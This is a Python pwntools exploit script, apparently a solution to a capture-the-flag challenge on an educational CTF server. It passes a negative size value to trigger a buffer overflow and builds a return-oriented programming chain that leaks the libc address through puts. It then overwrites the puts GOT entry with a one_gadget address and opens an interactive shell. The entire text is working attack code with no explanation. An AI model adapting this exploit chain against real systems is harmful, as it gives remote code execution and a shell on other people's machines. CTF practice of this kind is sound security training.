#!/usr/bin/env python3

import os
import pwn

pwn.context.arch = 'amd64'
libc = pwn.ELF('./libc-2.27.so')

remote = pwn.remote('eductf.zoolab.org', 10105)
#remote = pwn.remote('10.88.6.201', 12345)

remote.sendlineafter('Size: ', '-2147483648')
remote.recvuntil("It's safe now :)\n")

puts_got = 0x601018
puts_plt = 0x4005b0
pop_rdi = 0x0000000000400873
pop_rsi_r15 = 0x0000000000400871
read_plt = 0x4005d0
ret = 0x0000000000400294
payload = b'a' * 0x100 + pwn.p64(0) # rbp
payload += pwn.p64(pop_rdi) + pwn.p64(puts_got) + pwn.p64(puts_plt)
payload += pwn.p64(pop_rdi) + pwn.p64(0) + pwn.p64(pop_rsi_r15) + pwn.p64(puts_got) + pwn.p64(0) + pwn.p64(read_plt)
payload += pwn.p64(ret) + pwn.p64(puts_plt)

remote.send(payload)
libc_base = pwn.u64(remote.recvuntil('\n', drop=True).ljust(8, b'\x00')) - libc.symbols[b'puts']
print('libc:', hex(libc_base))

#input()
one_gadget = libc_base + 0x4f322 # [rsp+0x40] == NULL
remote.send(pwn.p64(one_gadget))

remote.interactive()
